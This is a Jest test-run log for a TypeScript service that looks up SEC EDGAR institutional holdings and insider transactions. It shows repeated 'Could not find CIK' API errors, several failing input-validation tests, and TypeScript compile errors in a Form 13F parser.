      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:415:7)

  console.log
    [2025-09-21T23:25:34.490Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 108ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 108,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:34.490Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:34.664Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol GOOGL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "GOOGL",
      "quarters": 4
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:421:22)

  console.log
    [2025-09-21T23:25:34.666Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 176ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 176,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:34.739Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:34.741Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:34.742Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:34.742Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:34.743Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:34.788Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol AAPL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "AAPL",
      "quarters": 1
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 0)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:434:23)

  console.log
    [2025-09-21T23:25:34.789Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 50ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 50,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 0)

  console.error
    [2025-09-21T23:25:34.937Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol MSFT
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "MSFT",
      "quarters": 1
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 1)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:434:23)

  console.log
    [2025-09-21T23:25:34.938Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 197ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 197,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 1)

  console.error
    [2025-09-21T23:25:35.111Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol GOOGL
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "GOOGL",
      "quarters": 1
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 2)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:434:23)

  console.log
    [2025-09-21T23:25:35.113Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 371ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 371,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 2)

  console.error
    [2025-09-21T23:25:35.319Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol AMZN
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "AMZN",
      "quarters": 1
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 3)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:434:23)

  console.log
    [2025-09-21T23:25:35.320Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 578ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 578,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 3)

  console.error
    [2025-09-21T23:25:35.616Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol TSLA
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "TSLA",
      "quarters": 1
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 4)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:434:23)

  console.log
    [2025-09-21T23:25:35.618Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 875ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 875,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 4)

  console.log
    ✓ Memory usage increased by -0.66MB for 5 symbols

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:453:15)

  console.log
    [2025-09-21T23:25:35.750Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:35.752Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.log
    [2025-09-21T23:25:35.752Z] DEBUG [InstitutionalDataService] Starting API call: getInstitutionalHoldings
    Metadata: {
      "timeout": 30000,
      "retries": 2
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)

  console.error
    [2025-09-21T23:25:35.854Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol MSFT
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "MSFT",
      "quarters": 1
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 0)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:462:7)

  console.log
    [2025-09-21T23:25:35.854Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 104ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 104,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 0)

  console.error
    [2025-09-21T23:25:36.050Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol MSFT
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "MSFT",
      "quarters": 1
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 1)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:462:7)

  console.log
    [2025-09-21T23:25:36.053Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 301ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 301,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 1)

  console.error
    [2025-09-21T23:25:36.211Z] ERROR [InstitutionalDataService] API Error: GET institutional_holdings - Could not find CIK for symbol MSFT
    Metadata: {
      "type": "api_error",
      "method": "GET",
      "url": "institutional_holdings",
      "error": {},
      "symbol": "MSFT",
      "quarters": 1
    }

      322 |     switch (entry.level) {
      323 |       case LogLevel.ERROR:
    > 324 |         console.error(formatted)
          |                 ^
      325 |         break
      326 |       case LogLevel.WARN:
      327 |         console.warn(formatted)

      at Logger.output (app/services/error-handling/Logger.ts:324:17)
      at Logger.log (app/services/error-handling/Logger.ts:313:10)
      at Logger.error (app/services/error-handling/Logger.ts:63:10)
      at Logger.logApiError (app/services/error-handling/Logger.ts:143:10)
      at InstitutionalDataService.executeGetInstitutionalHoldings (app/services/financial-data/InstitutionalDataService.ts:223:32)
      at RetryHandler.execute (app/services/error-handling/RetryHandler.ts:107:13)
      at Object.handleApiCall (app/services/error-handling/index.ts:72:24)
      at ErrorHandler.handleAsync (app/services/error-handling/ErrorHandler.ts:189:18)
          at async Promise.allSettled (index 2)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:462:7)

  console.log
    [2025-09-21T23:25:36.213Z] DEBUG [InstitutionalDataService] Performance: getInstitutionalHoldings completed in 461ms
    Metadata: {
      "type": "performance",
      "operation": "getInstitutionalHoldings",
      "duration": 461,
      "attempts": 1
    }

      at Logger.output (app/services/error-handling/Logger.ts:334:17)
          at async Promise.allSettled (index 2)

  console.log
    ✓ Rate limiting enforced: 464ms for 3 requests

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:468:15)

FAIL app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts (5.245 s, 532 MB heap size)
  InstitutionalDataService Basic Tests
    Service Initialization and Configuration
      ✓ should_initialize_service_with_default_configuration_successfully (53 ms)
      ✓ should_initialize_service_with_custom_configuration_successfully (62 ms)
      ✓ should_return_correct_source_identifier (62 ms)
      ✓ should_have_required_properties_and_methods (62 ms)
    Health Check and API Connectivity
      ✓ should_pass_health_check_with_valid_sec_edgar_endpoint (106 ms)
    Input Validation and Security
      ✕ should_reject_malicious_symbol_inputs_for_institutional_holdings (70 ms)
      ✕ should_reject_malicious_symbol_inputs_for_insider_transactions (61 ms)
      ✕ should_sanitize_and_normalize_valid_symbols (306 ms)
      ✓ should_enforce_rate_limiting_for_repeated_requests (98 ms)
    Basic API Method Tests
      ✓ should_handle_institutional_holdings_request_gracefully (113 ms)
      ✓ should_handle_insider_transactions_request_gracefully (100 ms)
      ✓ should_handle_institutional_intelligence_request_gracefully (305 ms)
      ✕ should_handle_invalid_symbols_gracefully (62 ms)
    Error Handling and Resilience
      ✓ should_handle_network_timeouts_gracefully (62 ms)
      ✓ should_handle_api_rate_limit_responses_gracefully (857 ms)
      ✓ should_sanitize_error_messages_to_prevent_information_disclosure (64 ms)
      ✓ should_maintain_cache_integrity_during_errors (360 ms)
    Cache Management
      ✓ should_implement_caching_for_institutional_holdings (508 ms)
      ✓ should_clear_cache_without_affecting_service_functionality (356 ms)
    Performance and Memory Management
      ✓ should_process_multiple_symbols_concurrently_without_memory_leaks (1011 ms)
      ✓ should_respect_request_queue_and_rate_limiting (540 ms)

  ● InstitutionalDataService Basic Tests › Input Validation and Security › should_reject_malicious_symbol_inputs_for_institutional_holdings

    expect(received).toBe(expected) // Object.is equality

    Expected: true
    Received: false

      104 |       for (const symbol of maliciousSymbols) {
      105 |         const result = await service.getInstitutionalHoldings(symbol)
    > 106 |         expect(Array.isArray(result)).toBe(true)
          |                                       ^
      107 |         expect(result.length).toBe(0) // Should return empty array for invalid symbols
      108 |       }
      109 |     })

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:106:39)

  ● InstitutionalDataService Basic Tests › Input Validation and Security › should_reject_malicious_symbol_inputs_for_insider_transactions

    expect(received).toBe(expected) // Object.is equality

    Expected: true
    Received: false

      119 |       for (const symbol of maliciousSymbols) {
      120 |         const result = await service.getInsiderTransactions(symbol)
    > 121 |         expect(Array.isArray(result)).toBe(true)
          |                                       ^
      122 |         expect(result.length).toBe(0) // Should return empty array for invalid symbols
      123 |       }
      124 |     })

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:121:39)

  ● InstitutionalDataService Basic Tests › Input Validation and Security › should_sanitize_and_normalize_valid_symbols

    expect(received).toBe(expected) // Object.is equality

    Expected: true
    Received: false

      138 |         const transactionsResult = await service.getInsiderTransactions(symbol)
      139 |
    > 140 |         expect(Array.isArray(holdingsResult)).toBe(true)
          |                                               ^
      141 |         expect(Array.isArray(transactionsResult)).toBe(true)
      142 |       }
      143 |     }, 30000)

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:140:47)

  ● InstitutionalDataService Basic Tests › Basic API Method Tests › should_handle_invalid_symbols_gracefully

    expect(received).toBe(expected) // Object.is equality

    Expected: true
    Received: false

      294 |       const intelligence = await service.getInstitutionalIntelligence(invalidSymbol)
      295 |
    > 296 |       expect(Array.isArray(holdings)).toBe(true)
          |                                       ^
      297 |       expect(holdings.length).toBe(0)
      298 |
      299 |       expect(Array.isArray(transactions)).toBe(true)

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalDataService.basic.test.ts:296:39)

  console.log
    [dotenv@17.2.2] injecting env (27) from .env -- tip: ⚙️  load multiple .env files with { path: ['.env.local', '.env'] }

      at _log (node_modules/dotenv/lib/main.js:139:11)

  console.error
    SEC EDGAR company info error for null: TypeError: Cannot read properties of null (reading 'toUpperCase')
        at SECEdgarAPI.symbolToCik (/Users/michaellocke/WebstormProjects/Home/public/vfr-api/app/services/financial-data/SECEdgarAPI.ts:290:34)
        at SECEdgarAPI.getCompanyInfo (/Users/michaellocke/WebstormProjects/Home/public/vfr-api/app/services/financial-data/SECEdgarAPI.ts:63:30)
        at Object.<anonymous> (/Users/michaellocke/WebstormProjects/Home/public/vfr-api/app/services/financial-data/__tests__/InstitutionalServices.integration.test.ts:211:36)
        at processTicksAndRejections (node:internal/process/task_queues:105:5)

      84 |       }
      85 |     } catch (error) {
    > 86 |       console.error(`SEC EDGAR company info error for ${symbol}:`, error)
         |               ^
      87 |       return null
      88 |     }
      89 |   }

      at SECEdgarAPI.getCompanyInfo (app/services/financial-data/SECEdgarAPI.ts:86:15)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalServices.integration.test.ts:211:26)

  console.error
    SEC EDGAR company info error for undefined: TypeError: Cannot read properties of undefined (reading 'toUpperCase')
        at SECEdgarAPI.symbolToCik (/Users/michaellocke/WebstormProjects/Home/public/vfr-api/app/services/financial-data/SECEdgarAPI.ts:290:34)
        at SECEdgarAPI.getCompanyInfo (/Users/michaellocke/WebstormProjects/Home/public/vfr-api/app/services/financial-data/SECEdgarAPI.ts:63:30)
        at Object.<anonymous> (/Users/michaellocke/WebstormProjects/Home/public/vfr-api/app/services/financial-data/__tests__/InstitutionalServices.integration.test.ts:211:36)
        at processTicksAndRejections (node:internal/process/task_queues:105:5)

      84 |       }
      85 |     } catch (error) {
    > 86 |       console.error(`SEC EDGAR company info error for ${symbol}:`, error)
         |               ^
      87 |       return null
      88 |     }
      89 |   }

      at SECEdgarAPI.getCompanyInfo (app/services/financial-data/SECEdgarAPI.ts:86:15)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalServices.integration.test.ts:211:26)

  console.error
    SEC EDGAR company info error for 123: TypeError: symbol.toUpperCase is not a function
        at SECEdgarAPI.symbolToCik (/Users/michaellocke/WebstormProjects/Home/public/vfr-api/app/services/financial-data/SECEdgarAPI.ts:290:34)
        at SECEdgarAPI.getCompanyInfo (/Users/michaellocke/WebstormProjects/Home/public/vfr-api/app/services/financial-data/SECEdgarAPI.ts:63:30)
        at Object.<anonymous> (/Users/michaellocke/WebstormProjects/Home/public/vfr-api/app/services/financial-data/__tests__/InstitutionalServices.integration.test.ts:211:36)
        at processTicksAndRejections (node:internal/process/task_queues:105:5)

      84 |       }
      85 |     } catch (error) {
    > 86 |       console.error(`SEC EDGAR company info error for ${symbol}:`, error)
         |               ^
      87 |       return null
      88 |     }
      89 |   }

      at SECEdgarAPI.getCompanyInfo (app/services/financial-data/SECEdgarAPI.ts:86:15)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalServices.integration.test.ts:211:26)

  console.error
    SEC EDGAR company info error for [object Object]: TypeError: symbol.toUpperCase is not a function
        at SECEdgarAPI.symbolToCik (/Users/michaellocke/WebstormProjects/Home/public/vfr-api/app/services/financial-data/SECEdgarAPI.ts:290:34)
        at SECEdgarAPI.getCompanyInfo (/Users/michaellocke/WebstormProjects/Home/public/vfr-api/app/services/financial-data/SECEdgarAPI.ts:63:30)
        at Object.<anonymous> (/Users/michaellocke/WebstormProjects/Home/public/vfr-api/app/services/financial-data/__tests__/InstitutionalServices.integration.test.ts:211:36)
        at processTicksAndRejections (node:internal/process/task_queues:105:5)

      84 |       }
      85 |     } catch (error) {
    > 86 |       console.error(`SEC EDGAR company info error for ${symbol}:`, error)
         |               ^
      87 |       return null
      88 |     }
      89 |   }

      at SECEdgarAPI.getCompanyInfo (app/services/financial-data/SECEdgarAPI.ts:86:15)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalServices.integration.test.ts:211:26)

  console.error
    SEC EDGAR company info error for : TypeError: symbol.toUpperCase is not a function
        at SECEdgarAPI.symbolToCik (/Users/michaellocke/WebstormProjects/Home/public/vfr-api/app/services/financial-data/SECEdgarAPI.ts:290:34)
        at SECEdgarAPI.getCompanyInfo (/Users/michaellocke/WebstormProjects/Home/public/vfr-api/app/services/financial-data/SECEdgarAPI.ts:63:30)
        at Object.<anonymous> (/Users/michaellocke/WebstormProjects/Home/public/vfr-api/app/services/financial-data/__tests__/InstitutionalServices.integration.test.ts:211:36)
        at processTicksAndRejections (node:internal/process/task_queues:105:5)

      84 |       }
      85 |     } catch (error) {
    > 86 |       console.error(`SEC EDGAR company info error for ${symbol}:`, error)
         |               ^
      87 |       return null
      88 |     }
      89 |   }

      at SECEdgarAPI.getCompanyInfo (app/services/financial-data/SECEdgarAPI.ts:86:15)
      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalServices.integration.test.ts:211:26)

  console.log
    ✓ SEC EDGAR API is accessible

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalServices.integration.test.ts:347:17)

  console.log
    ✓ Rate limiting enforced: 213ms for 3 requests

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalServices.integration.test.ts:366:15)

  console.log
    ✓ Successfully retrieved data for AAPL: Apple Inc.

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalServices.integration.test.ts:381:17)

  console.log
    ✓ All 8 main methods are available for testing

      at Object.<anonymous> (app/services/financial-data/__tests__/InstitutionalServices.integration.test.ts:439:15)

FAIL app/services/financial-data/__tests__/InstitutionalServices.integration.test.ts (542 MB heap size)
  Institutional Data Services Integration Tests
    Service Availability and Basic Functionality
      ✕ should_have_institutional_analysis_engine_available (185 ms)
      ✓ should_have_institutional_cache_manager_available (72 ms)
      ✓ should_have_institutional_data_service_available (65 ms)
      ✓ should_have_sec_edgar_api_available (83 ms)
    Module Exports and Structure
      ✕ should_export_institutional_analysis_engine_class (172 ms)
      ✓ should_export_institutional_cache_manager_class (65 ms)
      ✓ should_export_institutional_data_service_class (62 ms)
      ✓ should_export_sec_edgar_api_class (62 ms)
    Type Definitions and Interfaces
      ✓ should_have_institutional_holding_type_definition (168 ms)
      ✓ should_have_insider_transaction_type_definition (63 ms)
      ✓ should_have_institutional_intelligence_type_definition (62 ms)
      ✓ should_have_financial_data_provider_interface (64 ms)
    Service Instantiation Tests
      ✓ should_instantiate_sec_edgar_api_without_errors (97 ms)
      ✓ should_instantiate_sec_edgar_api_with_custom_timeout (65 ms)
      ✕ should_instantiate_institutional_analysis_engine_without_errors (172 ms)
      ✓ should_instantiate_institutional_cache_manager_without_errors (65 ms)
    Method Availability Tests
      ✓ should_have_required_methods_on_sec_edgar_api (63 ms)
      ✓ should_have_required_properties_on_sec_edgar_api (63 ms)
      ✓ should_have_user_agent_configured_for_sec_compliance (63 ms)
      ✓ should_have_rate_limiting_configured (62 ms)
    Error Handling Infrastructure
      ✓ should_handle_invalid_constructor_parameters_gracefully (64 ms)
      ✓ should_have_proper_error_handling_in_health_check (179 ms)
      ✓ should_handle_invalid_symbols_without_throwing (77 ms)
    Security and Input Validation
      ✓ should_reject_malicious_input_patterns (65 ms)
      ✓ should_sanitize_symbol_inputs (140 ms)
    Performance and Memory Tests
      ✓ should_not_leak_memory_during_multiple_instantiations (129 ms)
      ✓ should_handle_concurrent_method_calls_safely (279 ms)
    Integration with Existing Infrastructure
      ✓ should_integrate_with_security_validator (64 ms)
      ✓ should_integrate_with_base_financial_data_provider (63 ms)
      ✓ should_integrate_with_types_module (64 ms)
      ✓ should_integrate_with_cache_services (63 ms)
    Real API Connectivity Tests
      ✓ should_connect_to_sec_edgar_api_endpoint (157 ms)
      ✓ should_handle_real_api_rate_limiting (276 ms)
      ✓ should_handle_real_network_conditions (129 ms)
    TDD Compliance and Test Coverage
      ✓ should_follow_no_mock_data_principle (63 ms)
      ✓ should_test_actual_functionality_not_implementation_details (135 ms)
      ✓ should_provide_meaningful_test_coverage (73 ms)

  ● Institutional Data Services Integration Tests › Service Availability and Basic Functionality › should_have_institutional_analysis_engine_available

    expect(received).not.toThrow()

    Error name:    "TSError"
    Error message: "[96mapp/services/financial-data/Form13FParser.ts[0m:[93m68[0m:[93m7[0m - [91merror[0m[90m TS2353: [0mObject literal may only specify known properties, and 'parseNodeValue' does not exist in type 'X2jOptions'.·
    [7m68[0m       parseNodeValue: true,
    [7m  [0m [91m      ~~~~~~~~~~~~~~[0m
    [96mapp/services/financial-data/Form13FParser.ts[0m:[93m169[0m:[93m22[0m - [91merror[0m[90m TS2339: [0mProperty 'processElementValue' does not exist on type 'Transform'.·
    [7m169[0m                 this.processElementValue(currentElement, currentValue.trim(), currentHolding)
    [7m   [0m [91m                     ~~~~~~~~~~~~~~~~~~~[0m
    [96mapp/services/financial-data/Form13FParser.ts[0m:[93m181[0m:[93m45[0m - [91merror[0m[90m TS2339: [0mProperty 'isValidHolding' does not exist on type 'Transform'.·
    [7m181[0m                 if (insideInfoTable && this.isValidHolding(currentHolding)) {
    [7m   [0m [91m                                            ~~~~~~~~~~~~~~[0m
    [96mapp/services/financial-data/Form13FParser.ts[0m:[93m182[0m:[93m40[0m - [91merror[0m[90m TS2339: [0mProperty 'convertToInstitutionalHolding' does not exist on type 'Transform'.·
